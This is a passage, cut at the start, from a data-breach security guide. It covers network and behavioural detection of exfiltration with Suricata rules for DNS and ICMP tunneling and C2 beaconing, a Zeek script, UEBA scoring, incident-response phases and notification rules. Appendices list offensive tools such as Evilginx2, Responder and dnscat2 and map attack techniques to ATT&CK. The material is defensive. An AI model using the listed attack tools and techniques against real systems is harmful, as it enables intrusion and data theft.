level: critical
falsepositives:
    - None expected - these credentials should never be used legitimately
tags:
    - attack.credential_access
    - attack.t1552
```

### 10.4 Network Traffic Analysis for Exfiltration

**NetFlow analysis for anomalous outbound transfers:**

```bash
# Using nfdump to analyze NetFlow data for large outbound transfers
nfdump -R /var/flows/2026/05/07 \
    -o "fmt:%ts %td %sa %da %sp %dp %pkt %byt %fl" \
    -t '2026/05/07.00:00:00-2026/05/07.23:59:59' \
    'dst net not 10.0.0.0/8 and bytes > 10000000' \
    -s dstip/bytes -n 20
```

**Suricata rules for exfiltration detection:**

```yaml
# Detect large outbound data transfer over HTTPS
alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"Large TLS Data Transfer - Potential Exfiltration";
    flow:to_server,established;
    threshold: type both, track by_src, count 1, seconds 3600;
    byte_test:4,>,10000000,0;
    sid:2100040; rev:1;)

# Detect DNS tunneling based on query length and frequency
alert dns any any -> any any (msg:"DNS Tunneling - High Volume Queries to Single Domain";
    dns.query;
    pcre:"/^.{40,}\./";
    threshold: type both, track by_src, count 50, seconds 300;
    sid:2100041; rev:1;)

# Detect ICMP tunneling
alert icmp any any -> $EXTERNAL_NET any (msg:"ICMP Tunnel - Large Payload Echo Requests";
    itype:8;
    dsize:>100;
    threshold: type both, track by_src, count 30, seconds 60;
    sid:2100042; rev:1;)

# Detect beaconing behavior (regular interval callbacks)
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Potential C2 Beaconing - Regular Interval HTTP";
    flow:to_server,established;
    threshold: type both, track by_src, count 60, seconds 3600;
    sid:2100043; rev:1;)
```

**Zeek script for detecting data exfiltration:**

```zeek
# detect_exfil.zeek — Alert on large outbound data transfers
@load base/protocols/conn

module DataExfil;

export {
    redef enum Notice::Type += {
        Large_Outbound_Transfer,
        Sustained_Outbound_Transfer
    };

    const exfil_threshold: count = 50000000 &redef;  # 50MB
    const sustained_threshold: count = 10000000 &redef;  # 10MB per connection
}

event connection_state_remove(c: connection)
{
    if (c$id$orig_h in Site::local_nets &&
        c$id$resp_h !in Site::local_nets)
    {
        if (c$orig$size > exfil_threshold)
        {
            NOTICE([$note=Large_Outbound_Transfer,
                    $msg=fmt("Large outbound transfer: %s bytes to %s:%s",
                             c$orig$size, c$id$resp_h, c$id$resp_p),
                    $conn=c,
                    $identifier=cat(c$id$orig_h, c$id$resp_h)]);
        }
    }
}
```

### 10.5 UEBA for Detecting Anomalous Data Access

User and Entity Behavior Analytics (UEBA) builds behavioral baselines and detects deviations that indicate compromise or insider threat.

**Key behavioral features for data breach detection:**

| Feature | Normal Baseline | Anomaly Indicator |
|---|---|---|
| Daily data volume accessed | Consistent with role | >3x historical average |
| Unique tables/files accessed | Stable set | Access to new sensitive tables |
| Access time pattern | Business hours | Off-hours bulk access |
| Download volume | Minimal | Spike in downloads/exports |
| Query complexity | Simple lookups | Complex JOINs across sensitive tables |
| Geographic access pattern | Consistent location | Access from new country |
| Device fingerprint | Known devices | New or spoofed device |

**Example UEBA scoring logic (pseudocode):**

```python
def calculate_risk_score(user_id: str, current_activity: dict) -> float:
    """Calculate risk score based on deviation from behavioral baseline."""
    baseline = get_baseline(user_id)  # Historical 90-day baseline
    score = 0.0

    # Volume anomaly
    volume_ratio = current_activity["bytes_accessed"] / baseline["avg_daily_bytes"]
    if volume_ratio > 3.0:
        score += min(volume_ratio * 10, 40)  # Max 40 points

    # Time anomaly
    if current_activity["hour"] not in baseline["normal_hours"]:
        score += 15

    # New resource access
    new_resources = set(current_activity["resources"]) - set(baseline["normal_resources"])
    sensitive_new = [r for r in new_resources if r in SENSITIVE_RESOURCES]
    score += len(sensitive_new) * 10  # 10 points per new sensitive resource

    # Geographic anomaly
    if current_activity["country"] not in baseline["normal_countries"]:
        score += 20

    # Velocity anomaly (impossible travel)
    if is_impossible_travel(baseline["last_location"], current_activity["location"],
                            baseline["last_time"], current_activity["time"]):
        score += 30

    return min(score, 100)  # Normalize to 0-100
```

### 10.6 Incident Response for Data Breaches

A data breach IR process follows the NIST SP 800-61 framework with breach-specific additions.

**Phase 1: Detection and Initial Assessment**

```
1. Confirm the breach is real (not a false positive)
2. Determine data types involved (PII, PHI, PCI, credentials, IP)
3. Estimate scope: number of records, affected systems, affected individuals
4. Classify severity based on data sensitivity and volume
5. Activate the breach response team (IR lead, legal, comms, privacy officer)
```

**Phase 2: Containment**

```
Immediate containment (first 4 hours):
- Isolate compromised systems (network segmentation, not shutdown)
- Revoke compromised credentials and API keys
- Block attacker IPs/domains at perimeter
- Disable compromised accounts
- Preserve forensic evidence (memory dumps, disk images, logs)

Short-term containment (24-72 hours):
- Deploy additional monitoring on affected systems
- Implement emergency access controls
- Review and restrict data access paths
- Enable enhanced logging on all data repositories
```

**Phase 3: Scope Determination**

```sql
-- Determine what data was accessed (example for PostgreSQL with pgaudit)
SELECT log_time, user_name, database_name, command_tag, object_type,
       object_name, statement
FROM pgaudit.log
WHERE log_time BETWEEN '2026-05-01' AND '2026-05-07'
  AND user_name = 'compromised_account'
  AND command_tag IN ('SELECT', 'COPY')
  AND object_name IN ('customers', 'payment_cards', 'employees')
ORDER BY log_time;
```

```python
#!/usr/bin/env python3
"""Breach scope assessment — analyze access logs to determine
which records were accessed by the compromised account."""

import json
import re
from collections import Counter
from pathlib import Path

LOG_FILE = Path("/var/log/app/access.log")
COMPROMISED_SESSION = "sess_abc123compromised"

def analyze_breach_scope(log_path: Path, session_id: str) -> dict:
    """Parse access logs and determine breach scope."""
    accessed_endpoints = Counter()
    accessed_user_ids = set()
    total_requests = 0
    data_volume = 0

    pattern = re.compile(
        r'(?P<timestamp>\S+) .* session=(?P<session>\S+) '
        r'(?P<method>\S+) (?P<path>\S+) (?P<status>\d+) (?P<bytes>\d+)'
    )

    for line in log_path.read_text().splitlines():
        match = pattern.match(line)
        if match and match.group("session") == session_id:
            total_requests += 1
            path = match.group("path")
            accessed_endpoints[path] += 1
            data_volume += int(match.group("bytes"))

            # Extract user IDs from paths like /api/users/12345/profile
            user_match = re.search(r'/users/(\d+)', path)
            if user_match:
                accessed_user_ids.add(user_match.group(1))

    return {
        "total_requests": total_requests,
        "unique_endpoints": len(accessed_endpoints),
        "top_endpoints": accessed_endpoints.most_common(20),
        "unique_user_records_accessed": len(accessed_user_ids),
        "total_data_volume_bytes": data_volume,
        "user_ids_accessed": sorted(accessed_user_ids)
    }

if __name__ == "__main__":
    scope = analyze_breach_scope(LOG_FILE, COMPROMISED_SESSION)
    print(json.dumps(scope, indent=2))
    print(f"\n[!] Breach scope: {scope['unique_user_records_accessed']} user records accessed")
    print(f"[!] Total data volume: {scope['total_data_volume_bytes'] / 1024 / 1024:.2f} MB")
```

**Phase 4: Notification**

Notification obligations vary by jurisdiction, data type, and number of affected individuals:

| Jurisdiction | Timeline | Authority | Threshold |
|---|---|---|---|
| GDPR (EU) | 72 hours to DPA, without undue delay to individuals | National DPA | Risk to rights and freedoms |
| CCPA (California) | Without unreasonable delay | CA Attorney General (500+) | Unencrypted personal info |
| HIPAA (US Healthcare) | 60 days to HHS, individuals; media if >500 | HHS OCR | Unsecured PHI |
| SEC (US Public Companies) | 4 business days (material) | SEC | Material impact on investors |
| PIPEDA (Canada) | As soon as feasible | OPC | Real risk of significant harm |
| LGPD (Brazil) | Reasonable timeframe | ANPD | Risk or relevant damage |

**Phase 5: Eradication and Recovery**

```
1. Remove attacker access (patch vulnerabilities, rotate all credentials)
2. Rebuild compromised systems from known-good images
3. Implement additional controls to prevent recurrence
4. Verify containment through penetration testing
5. Restore from clean backups if data was destroyed/modified
6. Monitor for re-compromise (30-90 day heightened monitoring)
```

**Phase 6: Post-Incident**

```
1. Conduct root cause analysis
2. Document timeline with UTC ISO 8601 timestamps
3. Update incident response playbooks
4. Implement systemic improvements (not just point fixes)
5. Brief stakeholders and affected parties
6. Preserve evidence for potential legal proceedings
7. File regulatory reports within mandated timelines
```

---

## Appendix A: Tool Reference

| Tool | Purpose | License |
|---|---|---|
| sqlmap | Automated SQL injection | GPLv2 |
| Burp Suite | Web application testing | Commercial/Community |
| Evilginx2 | Phishing framework (MFA bypass) | Custom |
| Bettercap | Network attacks (MITM, sniffing) | GPLv3 |
| Trufflehog | Secret scanning in repos | AGPL |
| Nuclei | Vulnerability scanning with templates | MIT |
| BloodHound | Active Directory attack path analysis | GPLv3 |
| Impacket | Network protocol attacks | Apache 2.0 |
| CrackMapExec | Post-exploitation, credential testing | BSD |
| dnscat2 | DNS tunneling C2 | BSD |
| ptunnel-ng | ICMP tunneling | BSD |
| Responder | LLMNR/NBT-NS/MDNS poisoning | GPLv3 |

## Appendix B: MITRE ATT&CK Mapping

| Technique in this Document | ATT&CK ID | Tactic |
|---|---|---|
| SQL Injection | T1190 | Initial Access |
| Credential Stuffing | T1110.004 | Credential Access |
| Password Spraying | T1110.003 | Credential Access |
| Phishing (Evilginx2) | T1557 | Credential Access |
| SSRF to Metadata | T1552.005 | Credential Access |
| IDOR / Broken Access Control | T1530 | Collection |
| Cloud Storage Misconfiguration | T1530 | Collection |
| Database Exfiltration | T1213 | Collection |
| DNS Exfiltration | T1048.003 | Exfiltration |
| ICMP Tunneling | T1095 | Command and Control |
| Legitimate Service Abuse | T1567 | Exfiltration |
| USB Exfiltration | T1052.001 | Exfiltration |
| Steganography | T1027.003 | Defense Evasion |
| ARP Spoofing / MITM | T1557.002 | Collection |
| Insider Threat | T1074 | Collection |
| API Key Exposure | T1552.001 | Credential Access |

## Appendix C: Regulatory Quick Reference

| Regulation | Scope | Key Data Breach Requirements |
|---|---|---|
| GDPR | EU residents' data | 72h notification to DPA; DPO required; up to 4% global revenue fine |
| CCPA/CPRA | California residents | Right to know, delete, opt-out; statutory damages $100-$750/consumer/incident |
| HIPAA | US healthcare entities | 60-day notification; breach risk assessment; up to $2.13M per violation category |
| PCI DSS v4.0 | Payment card data | Quarterly scans; annual penetration tests; immediate incident response |
| SOX | US public companies | IT controls for financial data; CEO/CFO certification |
| GLBA | US financial institutions | Safeguards Rule; incident response program required |
| NIS2 | EU essential/important entities | 24h early warning, 72h notification; management body liability |

---

## References

1. Verizon. *2025 Data Breach Investigations Report (DBIR)*. 2025.
2. IBM Security. *Cost of a Data Breach Report 2025*. 2025.
3. MITRE. *ATT&CK Framework*. https://attack.mitre.org/
4. NIST. *SP 800-61 Rev. 2: Computer Security Incident Handling Guide*. 2012.
5. OWASP. *Testing Guide v4.2*. https://owasp.org/www-project-web-security-testing-guide/
6. PortSwigger. *SQL Injection Cheat Sheet*. https://portswigger.net/web-security/sql-injection/cheat-sheet
7. Kali Linux. *Penetration Testing Tools*. https://www.kali.org/tools/
8. SANS. *Incident Handler's Handbook*. 2023.
9. CIS. *Controls v8*. https://www.cisecurity.org/controls
10. ENISA. *Threat Landscape Report 2025*. 2025.
